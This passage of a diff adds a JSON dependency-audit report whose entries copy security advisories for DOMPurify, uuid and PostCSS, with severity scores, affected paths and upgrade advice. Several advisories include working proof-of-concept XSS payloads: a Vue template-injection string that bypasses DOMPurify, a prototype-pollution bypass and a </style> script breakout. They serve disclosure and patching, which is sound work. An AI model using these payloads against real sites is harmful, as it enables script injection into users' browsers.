+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.0\n- https://github.com/advisories/GHSA-crv5-9vww-q3g8",
+      "created": "2026-04-22T17:32:54.000Z",
+      "id": 1116951,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n| Field | Value |\n|:------|:------|\n| **Severity** | Medium |\n| **Affected** | DOMPurify `main` at [`883ac15`](https://github.com/cure53/DOMPurify/tree/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6), introduced in v1.0.10 ([`7fc196db`](https://github.com/cure53/DOMPurify/commit/7fc196db0b42a0c360262dba0cc39c9c91bfe1ec)) |\n\n`SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2.\n\n## Technical Details\n\nDOMPurify strips template expressions in two passes:\n\n1. **Per-node** — each text node is checked during the tree walk ([`purify.ts:1179-1191`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1179-L1191)):\n\n```js\n// pass #1: runs on every text node during tree walk\nif (SAFE_FOR_TEMPLATES && currentNode.nodeType === NODE_TYPE.text) {\n  content = currentNode.textContent;\n  content = content.replace(MUSTACHE_EXPR, ' ');  // {{...}} -> ' '\n  content = content.replace(ERB_EXPR, ' ');        // <%...%> -> ' '\n  content = content.replace(TMPLIT_EXPR, ' ');      // ${...  -> ' '\n  currentNode.textContent = content;\n}\n```\n\n2. **Final string scrub** — after serialization, the full HTML string is scrubbed again ([`purify.ts:1679-1683`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1679-L1683)). This is the safety net that catches expressions that only form after the DOM settles.\n\nThe `RETURN_DOM` path returns before pass #2 ever runs ([`purify.ts:1637-1661`](https://github.com/cure53/DOMPurify/blob/883ac15d47f907cb1a3b5a152fe90c4d8c10f9e6/src/purify.ts#L1637-L1661)):\n\n```js\n// purify.ts (simplified)\n\nif (RETURN_DOM) {\n  // ... build returnNode ...\n  return returnNode;        // <-- exits here, pass #2 never runs\n}\n\n// pass #2: only reached by string-mode callers\nif (SAFE_FOR_TEMPLATES) {\n  serializedHTML = serializedHTML.replace(MUSTACHE_EXPR, ' ');\n}\nreturn serializedHTML;\n```\n\nThe payload `{<foo></foo>{constructor.constructor('alert(1)')()}<foo></foo>}` exploits this:\n\n1. Parser creates: `TEXT(\"{\")` → `<foo>` → `TEXT(\"{payload}\")` → `<foo>` → `TEXT(\"}\")` — no single node contains `{{`, so pass #1 misses it\n2. `<foo>` is not allowed, so DOMPurify removes it but keeps surrounding text\n3. The three text nodes are now adjacent — `.outerHTML` reads them as `{{payload}}`, which Vue 2 compiles and executes\n\n## Reproduce\n\nOpen the following html in any browser and `alert(1)` pops up.\n\n```html\n<!DOCTYPE html>\n<html>\n\n<body>\n  <script src=\"https://cdn.jsdelivr.net/npm/dompurify@3.3.3/dist/purify.min.js\"></script>\n  <script src=\"https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.min.js\"></script>\n  <script>\n    var dirty = '<div id=\"app\">{<foo></foo>{constructor.constructor(\"alert(1)\")()}<foo></foo>}</div>';\n    var dom = DOMPurify.sanitize(dirty, { SAFE_FOR_TEMPLATES: true, RETURN_DOM: true });\n    document.body.appendChild(dom.firstChild);\n    new Vue({ el: '#app' });\n  </script>\n</body>\n\n</html>\n```\n\n## Impact\n\nAny application that sanitizes attacker-controlled HTML with `SAFE_FOR_TEMPLATES: true` and `RETURN_DOM: true` (or `RETURN_DOM_FRAGMENT: true`), then mounts the result into a template-evaluating framework, is vulnerable to XSS.\n\n## Recommendations\n\n### Fix\n\n`normalize()` merges the split text nodes, then the same regex from the string path catches the expression. Placed before the fragment logic, this fixes both `RETURN_DOM` and `RETURN_DOM_FRAGMENT`.\n\n```diff\n     if (RETURN_DOM) {\n+      if (SAFE_FOR_TEMPLATES) {\n+        body.normalize();\n+        let html = body.innerHTML;\n+        arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr: RegExp) => {\n+          html = stringReplace(html, expr, ' ');\n+        });\n+        body.innerHTML = html;\n+      }\n+\n       if (RETURN_DOM_FRAGMENT) {\n         returnNode = createDocumentFragment.call(body.ownerDocument);\n```",
+      "reported_by": null,
+      "title": "DOMPurify has a SAFE_FOR_TEMPLATES bypass in RETURN_DOM mode",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41239"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=1.0.10 <3.4.0",
+      "github_advisory_id": "GHSA-crv5-9vww-q3g8",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-22T17:32:56.000Z",
+      "cvss": {
+        "score": 6.8,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-1289"
+      ],
+      "url": "https://github.com/advisories/GHSA-crv5-9vww-q3g8"
+    },
+    "1116952": {
+      "findings": [
+        {
+          "version": "3.2.7",
+          "paths": [
+            "packages__slidev>@slidev/cli>monaco-editor>dompurify"
+          ]
+        },
+        {
+          "version": "3.3.3",
+          "paths": [
+            "packages__creator>@antdv-next/x>mermaid>dompurify"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.0\n- https://github.com/advisories/GHSA-v9jr-rg53-9pgp",
+      "created": "2026-04-22T17:31:32.000Z",
+      "id": 1116952,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nDOMPurify versions 3.0.1 through 3.3.3 (latest) are vulnerable to a prototype pollution-based XSS bypass. When an application uses `DOMPurify.sanitize()` with the default configuration (no `CUSTOM_ELEMENT_HANDLING` option), a prior prototype pollution gadget can inject permissive `tagNameCheck` and `attributeNameCheck` regex values into `Object.prototype`, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes — including event handlers — through sanitization.\n\n## Affected Versions\n\n- **3.0.1 through 3.3.3** (current latest) — all affected\n- **3.0.0 and all 2.x versions** — NOT affected (used `Object.create(null)` for initialization, no `|| {}` reassignment)\n- The vulnerable `|| {}` reassignment was introduced in the 3.0.0→3.0.1 refactor\n- This is **distinct** from GHSA-cj63-jhhr-wcxv (USE_PROFILES Array.prototype pollution, fixed in 3.3.2)\n- This is **distinct** from CVE-2024-45801 / GHSA-mmhx-hmjr-r674 (__depth prototype pollution, fixed in 3.1.3)\n\n## Root Cause\n\nIn `purify.js` at line 590, during config parsing:\n\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nWhen no `CUSTOM_ELEMENT_HANDLING` is specified in the config (the default usage pattern), `cfg.CUSTOM_ELEMENT_HANDLING` is `undefined`, and the fallback `{}` is used. This plain object inherits from `Object.prototype`.\n\nLines 591-598 then check `cfg.CUSTOM_ELEMENT_HANDLING` (the original config property) — which is `undefined` — so the conditional blocks that would set `tagNameCheck` and `attributeNameCheck` from the config are never entered.\n\nAs a result, `CUSTOM_ELEMENT_HANDLING.tagNameCheck` and `CUSTOM_ELEMENT_HANDLING.attributeNameCheck` resolve via the prototype chain. If an attacker has polluted `Object.prototype.tagNameCheck` and `Object.prototype.attributeNameCheck` with permissive values (e.g., `/.*/`), these polluted values flow into DOMPurify's custom element validation at lines 973-977 and attribute validation, causing all custom elements and all attributes to be allowed.\n\n## Impact\n\n- **Attack type:** XSS bypass via prototype pollution chain\n- **Prerequisites:** Attacker must have a prototype pollution primitive in the same execution context (e.g., vulnerable version of lodash, jQuery.extend, query-string parser, deep merge utility, or any other PP gadget)\n- **Config required:** Default. No special DOMPurify configuration needed. The standard `DOMPurify.sanitize(userInput)` call is affected.\n- **Payload:** Any HTML custom element (name containing a hyphen) with event handler attributes survives sanitization\n\n## Proof of Concept\n\n```javascript\n// Step 1: Attacker exploits a prototype pollution gadget elsewhere in the application\nObject.prototype.tagNameCheck = /.*/;\nObject.prototype.attributeNameCheck = /.*/;\n\n// Step 2: Application sanitizes user input with DEFAULT config\nconst clean = DOMPurify.sanitize('<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>');\n\n// Step 3: \"Sanitized\" output still contains the event handler\nconsole.log(clean);\n// Output: <x-x onfocus=\"alert(document.cookie)\" tabindex=\"0\" autofocus=\"\">\n\n// Step 4: When injected into DOM, XSS executes\ndocument.body.innerHTML = clean; // alert() fires\n```\n\n### Tested configurations that are vulnerable:\n\n| Call Pattern | Vulnerable? |\n|---|---|\n| `DOMPurify.sanitize(input)` | YES |\n| `DOMPurify.sanitize(input, {})` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: null })` | YES |\n| `DOMPurify.sanitize(input, { CUSTOM_ELEMENT_HANDLING: {} })` | NO (explicit object triggers L591 path) |\n\n## Suggested Fix\n\nChange line 590 from:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || {};\n```\n\nTo:\n```javascript\nCUSTOM_ELEMENT_HANDLING = cfg.CUSTOM_ELEMENT_HANDLING || create(null);\n```\n\nThe `create(null)` function (already used elsewhere in DOMPurify, e.g., in `clone()`) creates an object with no prototype, preventing prototype chain inheritance.\n\n### Alternative application-level mitigation:\n\nApplications can protect themselves by always providing an explicit `CUSTOM_ELEMENT_HANDLING` in their config:\n\n```javascript\nDOMPurify.sanitize(input, {\n  CUSTOM_ELEMENT_HANDLING: {\n    tagNameCheck: null,\n    attributeNameCheck: null\n  }\n});\n```\n\n## Timeline\n\n- **2026-04-04:** Vulnerability discovered during automated DOMPurify fuzzing research (Fermat project)\n- **2026-04-04:** Confirmed in Chrome browser with DOMPurify 3.3.3\n- **2026-04-04:** Verified distinct from GHSA-cj63-jhhr-wcxv and CVE-2024-45801\n- **2026-04-04:** Advisory drafted, responsible disclosure initiated\n\n## Credit\n\nhttps://github.com/trace37labs",
+      "reported_by": null,
+      "title": "DOMPurify: Prototype Pollution to XSS Bypass via CUSTOM_ELEMENT_HANDLING Fallback",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41238"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.0.1 <3.4.0",
+      "github_advisory_id": "GHSA-v9jr-rg53-9pgp",
+      "recommendation": "Upgrade to version 3.4.0 or later",
+      "patched_versions": ">=3.4.0",
+      "updated": "2026-04-22T17:31:32.000Z",
+      "cvss": {
+        "score": 6.9,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-v9jr-rg53-9pgp"
+    },
+    "1116970": {
+      "findings": [
+        {
+          "version": "11.1.0",
+          "paths": [
+            "packages__creator>@antdv-next/x>mermaid>uuid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/uuidjs/uuid/security/advisories/GHSA-w5hq-g745-h8pq\n- https://github.com/uuidjs/uuid/commit/3d2c5b0342f0fcb52a5ac681c3d47c13e7444b34\n- https://github.com/uuidjs/uuid/releases/tag/v14.0.0\n- https://github.com/advisories/GHSA-w5hq-g745-h8pq",
+      "created": "2026-04-22T20:53:24.000Z",
+      "id": 1116970,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`v3`, `v5`, and `v6` accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4`, `v1`, and `v7` explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3`/`v5` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4',()=>v4({},new Uint8Array(8),4)],\n  ['v5',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4 THREW RangeError`\n- `v5 NO_THROW`\n- `v6 NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4`/`v1`/`v7`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3` and `v5`)\n- `src/v6.ts`",
+      "reported_by": null,
+      "title": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "uuid",
+      "vulnerable_versions": "<14.0.0",
+      "github_advisory_id": "GHSA-w5hq-g745-h8pq",
+      "recommendation": "Upgrade to version 14.0.0 or later",
+      "patched_versions": ">=14.0.0",
+      "updated": "2026-04-22T20:53:25.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-787",
+        "CWE-1285"
+      ],
+      "url": "https://github.com/advisories/GHSA-w5hq-g745-h8pq"
+    },
+    "1117015": {
+      "findings": [
+        {
+          "version": "8.5.9",
+          "paths": [
+            "packages__creator>vite-plugin-vue-devtools>vite-plugin-vue-inspector>@vue/babel-plugin-jsx>@vue/babel-plugin-resolve-type>@vue/compiler-sfc>postcss"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/postcss/postcss/security/advisories/GHSA-qx2v-qp2m-jg93\n- https://nvd.nist.gov/vuln/detail/CVE-2026-41305\n- https://github.com/postcss/postcss/releases/tag/8.5.10\n- https://github.com/advisories/GHSA-qx2v-qp2m-jg93",
+      "created": "2026-04-24T15:31:42.000Z",
+      "id": 1117015,
+      "npm_advisory_id": null,
+      "overview": "# PostCSS: XSS via Unescaped `</style>` in CSS Stringify Output\n\n## Summary\n\nPostCSS v8.5.5 (latest) does not escape `</style>` sequences when stringifying CSS ASTs. When user-submitted CSS is parsed and re-stringified for embedding in HTML `<style>` tags, `</style>` in CSS values breaks out of the style context, enabling XSS.\n\n## Proof of Concept\n\n```javascript\nconst postcss = require('postcss');\n\n// Parse user CSS and re-stringify for page embedding\nconst userCSS = 'body { content: \"</style><script>alert(1)</script><style>\"; }';\nconst ast = postcss.parse(userCSS);\nconst output = ast.toResult().css;\nconst html = `<style>${output}</style>`;\n\nconsole.log(html);\n// <style>body { content: \"</style><script>alert(1)</script><style>\"; }</style>\n//\n// Browser: </style> closes the style tag, <script> executes\n```\n\n**Tested output** (Node.js v22, postcss v8.5.5):\n```\nInput: body { content: \"</style><script>alert(1)</script><style>\"; }\nOutput: body { content: \"</style><script>alert(1)</script><style>\"; }\nContains </style>: true\n```\n\n## Impact\n\nImpact non-bundler use cases since bundlers for XSS on their own. Requires some PostCSS plugin to have malware code, which can inject XSS to website.\n\n## Suggested Fix\n\nEscape `</style` in all stringified output values:\n```javascript\noutput = output.replace(/<\\/(style)/gi, '<\\\\/$1');\n```\n\n## Credits\nDiscovered and reported by [Sunil Kumar](https://tharvid.in) ([@TharVid](https://github.com/TharVid))",
+      "reported_by": null,
+      "title": "PostCSS has XSS via Unescaped </style> in its CSS Stringify Output",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-41305"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "postcss",
+      "vulnerable_versions": "<8.5.10",
+      "github_advisory_id": "GHSA-qx2v-qp2m-jg93",
+      "recommendation": "Upgrade to version 8.5.10 or later",
+      "patched_versions": ">=8.5.10",
+      "updated": "2026-04-24T15:31:44.000Z",
+      "cvss": {
+        "score": 6.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-qx2v-qp2m-jg93"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 0,
+      "moderate": 15,
+      "high": 0,
+      "critical": 0
+    },
+    "dependencies": 1280,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1280
+  }
+}
